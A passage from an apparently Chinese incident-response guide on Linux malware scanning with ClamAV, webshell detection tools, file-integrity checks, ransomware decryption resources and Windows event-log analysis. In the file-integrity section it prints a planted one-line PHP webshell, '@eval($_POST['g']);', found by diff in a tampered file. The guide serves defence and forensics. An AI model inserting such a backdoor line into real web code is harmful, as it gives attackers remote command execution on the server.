class="hljs-params">--prefix=</span> <span class="hljs-string">/usr/local/zlib/</span>make &amp;&amp; make install2、添加用户组clamav和组成员clamav：groupadd clamavuseradd -g clamav -s <span class="hljs-string">/bin/false</span> -c <span class="hljs-string">"Clam AntiVirus"</span> clamav3、安装Clamavtar –zxvf clamav-0.97.6.tar.gz<span class="hljs-keyword">cd</span> clamav-0.97.6<span class="hljs-string">./configure</span> <span class="hljs-params">--prefix=/opt/clamav</span> <span class="hljs-params">--disable-clamav</span> -with-zlib=<span class="hljs-string">/usr/local/zlib</span>makemake install4、配置Clamavmkdir <span class="hljs-string">/opt/clamav/logs</span>mkdir <span class="hljs-string">/opt/clamav/updata</span>touch <span class="hljs-string">/opt/clamav/logs/freshclam.log</span>touch <span class="hljs-string">/opt/clamav/logs/clamd.log</span><span class="hljs-keyword">cd</span> <span class="hljs-string">/opt/clamav/logs</span>chown clamav<span class="hljs-function">:clamav</span> clamd.logchown clamav<span class="hljs-function">:clamav</span> freshclam.log5、ClamAV 使用： <span class="hljs-string">/opt/clamav/bin/freshclam</span> 升级病毒库<span class="hljs-string">./clamscan</span> –h 查看相应的帮助信息<span class="hljs-string">./clamscan</span> -r <span class="hljs-string">/home</span>  扫描所有用户的主目录就使用<span class="hljs-string">./clamscan</span> -r <span class="hljs-params">--bell</span> -i <span class="hljs-string">/bin</span>  扫描bin目录并且显示有问题的文件的扫描结果</code></pre><p>安装方式二： </p><pre><code class="hljs jboss-cli"><span class="hljs-comment">#安装</span>yum install -y clamav<span class="hljs-comment">#更新病毒库</span>freshclam<span class="hljs-comment">#扫描方法</span>clamscan -r <span class="hljs-string">/etc</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/etcclamav.log</span>clamscan -r <span class="hljs-string">/bin</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/binclamav.log</span>clamscan -r <span class="hljs-string">/usr</span> <span class="hljs-params">--max-dir-recursion=5</span> -l <span class="hljs-string">/root/usrclamav.log</span><span class="hljs-comment">#扫描并杀毒</span>clamscan -r  <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/bin/bsd-port</span>clamscan -r  <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/bin/</span>clamscan -r <span class="hljs-params">--remove</span>  <span class="hljs-string">/usr/local/zabbix/sbin</span><span class="hljs-comment">#查看日志发现</span>cat <span class="hljs-string">/root/usrclamav.log</span> |grep FOUND</code></pre></li></ul><h4 id="2-3-webshell查杀"><a href="#2-3-webshell查杀" class="headerlink" title="2.3 webshell查杀"></a>2.3 webshell查杀</h4><p>linux版：</p><pre><code class="hljs groovy">河马webshell查杀：<span class="hljs-string">http:</span><span class="hljs-comment">//www.shellpub.com</span>深信服Webshell网站后门检测工具：<span class="hljs-string">http:</span><span class="hljs-comment">//edr.sangfor.com.cn/backdoor_detection.html</span></code></pre><h4 id="2-4-RPM-check检查"><a href="#2-4-RPM-check检查" class="headerlink" title="2.4 RPM check检查"></a>2.4 RPM check检查</h4><p>​    系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：</p><pre><code class="hljs 1c">./rpm -Va &gt; rpm.<span class="hljs-built_in">log</span></code></pre><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><pre><code class="hljs properties"><span class="hljs-attr">验证内容中的8个信息的具体内容如下：</span><span class="hljs-attr">S</span>         <span class="hljs-string">文件大小是否改变</span><span class="hljs-attr">M</span>         <span class="hljs-string">文件的类型或文件的权限（rwx）是否被改变</span><span class="hljs-attr">5</span>         <span class="hljs-string">文件MD5校验是否改变（可以看成文件内容是否改变）</span><span class="hljs-attr">D</span>         <span class="hljs-string">设备中，从代码是否改变</span><span class="hljs-attr">L</span>         <span class="hljs-string">文件路径是否改变</span><span class="hljs-attr">U</span>         <span class="hljs-string">文件的属主（所有者）是否改变</span><span class="hljs-attr">G</span>         <span class="hljs-string">文件的属组是否改变</span><span class="hljs-attr">T</span>         <span class="hljs-string">文件的修改时间是否改变</span></code></pre><p>如果命令被替换了，如果还原回来：</p><pre><code class="hljs jboss-cli">文件提取还原案例：rpm  -qf <span class="hljs-string">/bin/ls</span>  查询<span class="hljs-keyword">ls</span>命令属于哪个软件包mv  <span class="hljs-string">/bin/ls</span> <span class="hljs-string">/tmp</span>  先把<span class="hljs-keyword">ls</span>转移到tmp目录下，造成<span class="hljs-keyword">ls</span>命令丢失的假象rpm2cpio <span class="hljs-string">/mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm</span> | cpio -idv <span class="hljs-string">./bin/ls</span> 提取rpm包中<span class="hljs-keyword">ls</span>命令到当前目录的<span class="hljs-string">/bin/ls</span>下cp <span class="hljs-string">/root/bin/ls</span>  <span class="hljs-string">/bin/</span> 把<span class="hljs-keyword">ls</span>命令复制到<span class="hljs-string">/bin/</span>目录 修复文件丢失</code></pre><h4 id="2-5-linux安全检查脚本"><a href="#2-5-linux安全检查脚本" class="headerlink" title="2.5 linux安全检查脚本"></a>2.5 linux安全检查脚本</h4><p>Github项目地址：</p><p><a href="https://github.com/grayddq/GScan" target="_blank" rel="noopener">https://github.com/grayddq/GScan</a></p><p><a href="https://github.com/ppabc/security_check" target="_blank" rel="noopener">https://github.com/ppabc/security_check</a></p><p><a href="https://github.com/T0xst/linux" target="_blank" rel="noopener">https://github.com/T0xst/linux</a></p><p><strong>尽信书不如无书，工具只是辅助，别太过于依赖，关键在于你如何解决问题的思路。</strong></p><h2 id="第3篇：常见的Webshell查杀工具"><a href="#第3篇：常见的Webshell查杀工具" class="headerlink" title="第3篇：常见的Webshell查杀工具"></a>第3篇：常见的Webshell查杀工具</h2><p>当网站服务器被入侵时，我们需要一款Webshell检测工具，来帮助我们发现webshell，进一步排查系统可能存在的安全漏洞。</p><p>本文推荐了10款Webshll检测工具，用于网站入侵排查。当然，目前市场上的很多主机安全产品也都提供这种WebShell检测能力，比如阿里云、青藤云、safedog等，本文暂不讨论。</p><hr><p><strong>1、D盾_Web查杀</strong></p><p>阿D出品，使用自行研发不分扩展名的代码分析引擎，能分析更为隐藏的WebShell后门行为。</p><p>兼容性：只提供Windows版本。</p><p>工具下载地址：<a href="http://www.d99net.net/down/WebShellKill_V2.0.9.zip" target="_blank" rel="noopener">http://www.d99net.net/down/WebShellKill_V2.0.9.zip</a></p><p><img src="/image/20200407-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、百度WEBDIR+</strong></p><p>下一代WebShell检测引擎，采用先进的动态监测技术，结合多种引擎零规则查杀。</p><p>兼容性：提供在线查杀木马，免费开放API支持批量检测。</p><p>在线查杀地址：<a href="https://scanner.baidu.com/" target="_blank" rel="noopener">https://scanner.baidu.com/</a></p><p><img src="/image/20200407-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>3、河马</strong></p><p>专注webshell查杀研究，拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p><p>兼容性：支持Windows、linux，支持在线查杀。</p><p>官方网站：<a href="https://www.shellpub.com/" target="_blank" rel="noopener">https://www.shellpub.com/</a></p><p><img src="/image/20200407-3.png" srcset="/img/loading.gif" alt=""></p><p><strong>4、Web Shell Detector</strong></p><p>Webshell Detector具有“ Webshell”签名数据库，可帮助识别高达99％的“ Webshell”。</p><p>兼容性：提供php/python脚本，可跨平台，在线检测。</p><p>官方网站：<a href="http://www.shelldetector.com/" target="_blank" rel="noopener">http://www.shelldetector.com/</a></p><p>github项目地址：<a href="https://github.com/emposha/PHP-Shell-Detector" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector</a></p><p><img src="/image/20200407-4.png" srcset="/img/loading.gif" alt=""></p><p><strong>5、CloudWalker（牧云）</strong></p><p>一个可执行的命令行版本 Webshell 检测工具。目前，项目已停止更新。</p><p>兼容性，提供linux版本，Windows 暂不支持。</p><p>在线查杀demo：<a href="https://webshellchop.chaitin.cn/" target="_blank" rel="noopener">https://webshellchop.chaitin.cn/</a></p><p>github项目地址：<a href="https://github.com/chaitin/cloudwalker" target="_blank" rel="noopener">https://github.com/chaitin/cloudwalker</a></p><p><img src="/image/20200407-5.png" srcset="/img/loading.gif" alt=""></p><p><strong>6、Sangfor WebShellKill</strong></p><p>Sangfor WebShellKill(网站后门检测工具)是一款web后门专杀工具，不仅支持webshell的扫描，同时还支持暗链的扫描。是一款融合了多重检测引擎的查杀工具。能更精准地检测出WEB网站已知和未知的后门文件。</p><p>兼容性：支持Windows、linux</p><p>工具下载地址：<a href="http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）" target="_blank" rel="noopener">http://edr.sangfor.com.cn/backdoor_detection.html（已停止访问）</a></p><p><img src="/image/20200407-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>7、深度学习模型检测PHP Webshell</strong></p><p>一个深度学习PHP webshell查杀引擎demo，提供在线样本检测。</p><p>在线查杀地址：<a href="http://webshell.cdxy.me/" target="_blank" rel="noopener">http://webshell.cdxy.me/</a></p><p><img src="/image/20200407-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>8、PHP Malware Finder</strong></p><p>PHP-malware-finder 是一款优秀的检测webshell和恶意软件混淆代码的工具</p><p>兼容性：提供linux版本，Windows 暂不支持。</p><p>github项目地址：<a href="https://github.com/jvoisin/php-malware-finder" target="_blank" rel="noopener">https://github.com/jvoisin/php-malware-finder</a></p><p><img src="/image/20200407-8.png" srcset="/img/loading.gif" alt=""></p><p><strong>9、findWebshell</strong></p><p>这个项目是一款基于python开发的webshell检查工具，可以根据特征码匹配检查任意类型的webshell后门。</p><p>github项目地址：<a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a></p><p><img src="/image/20200407-9.png" srcset="/img/loading.gif" alt=""></p><p><strong>10、在线webshell查杀工具</strong></p><p>在线查杀地址：<a href="http://tools.bugscaner.com/killwebshell/" target="_blank" rel="noopener">http://tools.bugscaner.com/killwebshell/</a></p><p><img src="/image/20200407-10.png" srcset="/img/loading.gif" alt=""></p><h2 id="第4篇：如何发现隐藏的Webshell后门"><a href="#第4篇：如何发现隐藏的Webshell后门" class="headerlink" title="第4篇：如何发现隐藏的Webshell后门"></a>第4篇：如何发现隐藏的Webshell后门</h2><p>如何在百万行代码里发现隐藏的后门</p><p>试想一下，如果你的网站被入侵，攻击者留下隐藏的后门，你真的都可以找出来嘛？面对一个大中型的应用系统，数以百万级的代码行，是不可能做到每个文件每段代码进行手工检查的。</p><p>即使是一款拥有99.9%的Webshell检出率的检测引擎，依然可能存在Webshell绕过的情况。另外，像暗链、网页劫持、页面跳转等常见的黑帽SEO手法，也很难通过手动检测或工具检测全部识别出来。</p><p>最好的方式就是做文件完整性验证。通过与原始代码对比，可以快速发现文件是否被篡改以及被篡改的位置。当然，第一个前提是，你所在的团队已具备代码版本管理的能力，如果你是个人站长，相信你已经备份了原始代码。</p><p>本文将结合实际应用，介绍几种文件完整性验证方式，可以帮助你找出代码中所有隐藏的后门。</p><hr><p><strong>1、文件MD5校验</strong></p><p>下载D盾_Web查杀工具的时候，我们可以留意到下载的压缩包里，除了有一个exe可执行文件，还有一个文件md5值。这个是软件作者在发布软件时，通过md5算法计算出该exe文件的“特征值”。</p><pre><code class="hljs reasonml">下载地址：http:<span class="hljs-comment">//www.d99net.net/down/WebShellKill_V2.0.9.zip</span>文件MD5：<span class="hljs-number">29285</span>decadbce3918a4f8429ec33df46   <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">WebShellKill</span>.</span></span>exe</code></pre><p>当用户下载软件时，可以使用相同的校验算法计算下载到exe文件的特征值，并与软件开发者发布的特征值比较。如果两个特征值相同，则认为下载到的exe文件是正确的。如果两个特征值不同，则认为下载到exe文件是被篡改过的。</p><p>那同理可得，我们可以将所有网站文件计算一次hash值保存，当出现应急情况时，重新计算一次hash值，并与上次保存的hash值进行对比，从而输出新创建的、修改过及删除的文件列表。</p><p>文件hash值计算：</p><pre><code class="hljs vim">def md5sum(<span class="hljs-keyword">file</span>):    <span class="hljs-keyword">m</span>=hashlib.md5()    <span class="hljs-keyword">if</span> os.path.isfile(<span class="hljs-keyword">file</span>):        <span class="hljs-keyword">f</span>=<span class="hljs-keyword">open</span>(<span class="hljs-keyword">file</span>,<span class="hljs-string">'rb'</span>)        <span class="hljs-keyword">for</span> <span class="hljs-built_in">line</span> in <span class="hljs-keyword">f</span>:            <span class="hljs-keyword">m</span>.<span class="hljs-keyword">update</span>(<span class="hljs-built_in">line</span>)        <span class="hljs-keyword">f</span>.<span class="hljs-keyword">close</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">m</span>.<span class="hljs-keyword">update</span>(<span class="hljs-keyword">file</span>)    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">m</span>.hexdigest())</code></pre><p>对文件进行哈希值重新计算，进行校验对比，测试效果：</p><p><img src="/image/20200411-1.png" srcset="/img/loading.gif" alt=""></p><p>如上图，在上传目录新增了一个evil.php文件，还有一个被篡改的文件是low.php。使用常见的编辑器NotePad++进行对比，可以发现low.php文件里被插入了一句话webshell。</p><p><img src="/image/20200411-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>2、diff命令</strong></p><p>在linux中，我们经常使用diff来比较两个文本文件的差异。同样，我们可以通过一行命令快速找出两个项目文件的差异。</p><pre><code class="hljs livecodeserver">diff -c -<span class="hljs-keyword">a</span> -r cms1 cms2</code></pre><p>如下图所示，前三行列出了两个要对比的文件目录的差异，可以发现low.php文件被篡改过，篡改的内容是<code>@eval($_POST['g']);</code>。</p><p><img src="/image/20200411-3.png" srcset="/img/loading.gif" alt=""></p><p>备注：如果只是想查看两个文件是否不同又不想显示差异之处的话，可以加上－q选项。</p><p><strong>3、版本控制工具</strong></p><p>版本控制工具，比如说git，重新上传代码到git，add+commit+push，然后打开项目，点击commits，在历史提交版本里面，查看文件更改内容，很容易就可以发现代码被篡改的地方了。</p><p>另外，也可以通过git diff 用来比较文件之间的不同。</p><p><img src="/image/20200411-4.png" srcset="/img/loading.gif" alt=""></p><p><strong>4、文件对比工具</strong></p><p>关键词：代码对比工具，你会找到很多好用的工具，这里我们推荐两款效果还不错的工具，Beyond Compare和WinMerge。</p><p><strong>Beyond Compare</strong></p><p>Beyond Compare是一套由Scooter Software推出的文件比较工具。主要用途是对比两个文件夹或者文件，并将差异以颜色标示，比较范围包括目录，文档内容等。</p><p>下载地址：<a href="http://www.scootersoftware.com/download.php" target="_blank" rel="noopener">http://www.scootersoftware.com/download.php</a></p><p>软件使用示例，通过文件夹比较，找出文件夹中的差异内容。</p><p>1、双击Beyond Compare ，打开软件主页，选择文件夹比较。</p><p><img src="/image/20200411-5.png" srcset="/img/loading.gif" alt=""></p><p>2、在双边栏输入文件夹路径，点击显示差别，列出差异部分的内容，紫色部分为新增文件，红色部分为篡改文件。</p><p><img src="/image/20200411-6.png" srcset="/img/loading.gif" alt=""></p><p>3、双击具体文件，进入代码对比，找到代码差异部分。</p><p><img src="/image/20200411-7.png" srcset="/img/loading.gif" alt=""></p><p><strong>WinMerge</strong></p><p>WinMerge是一款运行于Windows系统下的文件比较和合并工具，使用它可以非常方便地比较文件夹和文件，以易于理解的可视文本格式显示差异。</p><p>下载地址：<a href="https://winmerge.org/downloads/" target="_blank" rel="noopener">https://winmerge.org/downloads/</a></p><p>1、文件–打开，选择文件或文件夹，然后点击进行比较。</p><p><img src="/image/20200411-8.png" srcset="/img/loading.gif" alt=""></p><p>2、在同一个界面里，通过颜色和文本提示，显示文件夹内容差异。</p><p><img src="/image/20200411-9.png" srcset="/img/loading.gif" alt=""></p><h2 id="第5篇：勒索病毒自救指南"><a href="#第5篇：勒索病毒自救指南" class="headerlink" title="第5篇：勒索病毒自救指南"></a>第5篇：勒索病毒自救指南</h2><p>经常会有一些小伙伴问：中了勒索病毒，该怎么办，可以解密吗？</p><p>第一次遇到勒索病毒是在早几年的时候，客户因网站访问异常，进而远程协助进行排查。登录服务器，在站点目录下发现所有的脚本文件及附件后缀名被篡改，每个文件夹下都有一个文件打开后显示勒索提示信息，这便是勒索病毒的特征。</p><p>出于职业习惯，我打包了部分加密文件样本和勒索病毒提示信息用于留档，就在今天，我又重新上传了样本，至今依然无法解密。</p><p>作为一个安全工程师，而非一个专业的病毒分析师，我们可以借助各大安全公司的能力，寻找勒索病毒的解密工具。</p><p>本文整理了一份勒索病毒自救指南，通过勒索病毒索引引擎查找勒索病毒相关信息，再通过各个安全公司提供的免费勒索软件解密工具解密。当然，能否解密全凭运气，so，平时还是勤打补丁多备份。</p><p><strong>勒索病毒搜索引擎</strong></p><p>在勒索病毒搜索引擎输入病毒名、勒索邮箱、被加密后文件的后缀名，或直接上传被加密文件、勒索提示信息，即可可快速查找到病毒详情和解密工具。</p><p><img src="/image/20200406-1.png" srcset="/img/loading.gif" alt=""></p><p>这些网站的解密能力还在持续更新中，是值得收藏的几个勒索病毒工具型网站。</p><p>【360】 勒索病毒搜索引擎，支持检索超过800种常见勒索病毒，</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//lesuobingdu.360.cn</span></code></pre><p>【腾讯】 勒索病毒搜索引擎，支持检索超过 300 种常见勒索病毒</p><pre><code class="hljs vim">http<span class="hljs-variable">s:</span>//guanjia.qq.<span class="hljs-keyword">com</span>/pr/<span class="hljs-keyword">ls</span>/</code></pre><p>【启明】VenusEye勒索病毒搜索引擎，超300种勒索病毒家族</p><pre><code class="hljs vim">http<span class="hljs-variable">s:</span>//lesuo.venuseye.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">cn</span>/</code></pre><p>【奇安信】勒索病毒搜索引擎</p><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//lesuobingdu.qianxin.com/</span></code></pre><p>【深信服】勒索病毒搜索引擎</p><pre><code class="hljs vim">http<span class="hljs-variable">s:</span>//edr.sangfor.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">cn</span>/#/information/ransom_search</code></pre><hr><p><strong>勒索软件解密工具集</strong></p><p>很多安全公司都提供了免费的勒索病毒解密工具下载，收集和整理相关下载地址，可以帮助我们了解和获取最新的勒索病毒解密工具。</p><p>【腾讯哈勃】勒索软件专杀工具</p><pre><code class="hljs vim">http<span class="hljs-variable">s:</span>//habo.qq.<span class="hljs-keyword">com</span>/tool/<span class="hljs-built_in">index</span></code></pre><p>【金山毒霸】勒索病毒免疫工具</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.duba.net<span class="hljs-regexp">/dbt/</span>wannacry.html</code></pre><p>【火绒】安全工具下载</p><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//bbs.huorong.cn/forum-55-1.html</span></code></pre><p>【瑞星】解密工具下载</p><pre><code class="hljs vim">http://it.rising.<span class="hljs-keyword">com</span>.<span class="hljs-keyword">cn</span>/fanglesuo/<span class="hljs-built_in">index</span>.html</code></pre><p>【nomoreransom】勒索软件解密工具集</p><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.nomoreransom<span class="hljs-meta">.org</span>/<span class="hljs-built_in">zh</span>/index.html</code></pre><p>【MalwareHunterTeam】勒索软件解密工具集</p><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//id-ransomware.malwarehunterteam.com/</span></code></pre><p>【卡巴斯基】免费勒索解密器</p><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//noransom.kaspersky.com/</span></code></pre><p>【Avast】免费勒索软件解密工具</p><pre><code class="hljs vim">http<span class="hljs-variable">s:</span>//www.avast.<span class="hljs-keyword">com</span>/zh-<span class="hljs-keyword">cn</span>/ransomware-decryption-tools</code></pre><p>【Emsisoft】免费勒索软件解密工具</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.emsisoft.com<span class="hljs-regexp">/ransomware-decryption-tools/</span>free-download</code></pre><p>【Github项目】勒索病毒解密工具收集汇总</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jiansiting/</span>Decryption-Tools</code></pre><h1 id="第二章：日志分析篇"><a href="#第二章：日志分析篇" class="headerlink" title="第二章：日志分析篇"></a>第二章：日志分析篇</h1><h2 id="第1篇-Window日志分析"><a href="#第1篇-Window日志分析" class="headerlink" title="第1篇:Window日志分析"></a>第1篇:Window日志分析</h2><h3 id="0x01-Window事件日志简介"><a href="#0x01-Window事件日志简介" class="headerlink" title="0x01 Window事件日志简介"></a>0x01 Window事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p><p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p><p><strong>系统日志</strong></p><pre><code class="hljs taggerscript">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。默认位置： <span class="hljs-variable">%SystemRoot%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>inevt<span class="hljs-symbol">\L</span>ogs<span class="hljs-symbol">\S</span>ystem.evtx</code></pre><p><strong>应用程序日志</strong></p><pre><code class="hljs taggerscript">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 默认位置：<span class="hljs-variable">%SystemRoot%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>inevt<span class="hljs-symbol">\L</span>ogs<span class="hljs-symbol">\A</span>pplication.evtx</code></pre><p><strong>安全日志</strong></p><pre><code class="hljs taggerscript">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。默认位置：<span class="hljs-variable">%SystemRoot%</span><span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\W</span>inevt<span class="hljs-symbol">\L</span>ogs<span class="hljs-symbol">\S</span>ecurity.evtx</code></pre><p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p><h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p><p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p><p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p><p><img src="/image/log-1-1.png" srcset="/img/loading.gif" alt=""></p><p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p><p><img src="/image/log-1-2.png" srcset="/img/loading.gif" alt=""></p><p><strong>查看系统日志方法：</strong></p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p></li><li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p><p><img src="/image/log-1-3.png" srcset="/img/loading.gif" alt=""></p></li></ol><h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p><table><thead><tr><th align="left">事件ID</th><th>说明</th></tr></thead><tbody><tr><td align="left">4624</td><td>登录成功</td></tr><tr><td align="left">4625</td><td>登录失败</td></tr><tr><td align="left">4634</td><td>注销成功</td></tr><tr><td align="left">4647</td><td>用户启动的注销</td></tr><tr><td align="left">4672</td><td>使用超级用户（如管理员）进行登录</td></tr><tr><td align="left">4720</td><td>创建用户</td></tr></tbody></table><p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p><table><thead><tr><th align="left">登录类型</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td align="left">2</td><td>交互式登录（Interactive）</td><td>用户在本地进行登录。</td></tr><tr><td align="left">3</td><td>网络（Network）</td><td>最常见的情况就是连接到共享文件夹或共享打印机时。</td></tr><tr><td align="left">4</td><td>批处理（Batch）</td><td>通常表明某计划任务启动。</td></tr><tr><td align="left">5</td><td>服务（Service）</td><td>每种服务都被配置在某个特定的用户账号下运行。</td></tr><tr><td align="left">7</td><td>解锁（Unlock）</td><td>屏保解锁。</td></tr><tr><td align="left">8</td><td>网络明文（NetworkCleartext）</td><td>登录的密码在网络上是通过明文传输的，如FTP。</td></tr><tr><td align="left">9</td><td>新凭证（NewCredentials）</td><td>使用带/Netonly参数的RUNAS命令运行一个程序。</td></tr><tr><td align="left">10</td><td>远程交互，（RemoteInteractive）</td><td>通过终端服务、远程桌面或远程协助访问计算机。</td></tr><tr><td align="left">11</td><td>缓存交互（CachedInteractive）</td><td>以一个域用户登录而又没有域控制器可用</td></tr></tbody></table><p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p><blockquote><p>原文链接 ：<a href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008" target="_blank" rel="noopener">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p></blockquote><p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p><ol><li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p></li><li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p></li><li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p></li></ol><p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p><p><img src="/image/log-1-4.png" srcset="/img/loading.gif" alt=""></p><p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p><p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p><p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p><p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p><p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p><p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p><p><img src="/image/log-1-5.png" srcset="/img/loading.gif" alt=""></p><h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p><p>Log Parser 2.2下载地址：<a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659" target="_blank" rel="noopener">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p><p>Log Parser 使用示例：<a href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/" target="_blank" rel="noopener">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p><p><img src="/image/log-1-6.png" srcset="/img/loading.gif" alt=""></p><p><strong>基本查询结构</strong> </p><pre><code class="hljs css"><span class="hljs-selector-tag">Logparser</span><span class="hljs-selector-class">.exe</span> –<span class="hljs-selector-tag">i</span><span class="hljs-selector-pseudo">:EVT</span> –<span class="hljs-selector-tag">o</span><span class="hljs-selector-pseudo">:DATAGRID</span> "<span class="hljs-selector-tag">SELECT</span> * <span class="hljs-selector-tag">FROM</span> <span class="hljs-selector-tag">c</span>:\<span class="hljs-selector-tag">xx</span><span class="hljs-selector-class">.evtx</span>"</code></pre><p><strong>使用Log Parser分析日志</strong></p><p>1、查询登录成功的事件</p><pre><code class="hljs sql">登录成功的所有事件LogParser.exe -i:EVT –o:DATAGRID  "<span class="hljs-keyword">SELECT</span> *  <span class="hljs-keyword">FROM</span> c:\Security.evtx <span class="hljs-keyword">where</span> EventID=<span class="hljs-number">4624</span><span class="hljs-string">"</span><span class="hljs-string"></span><span 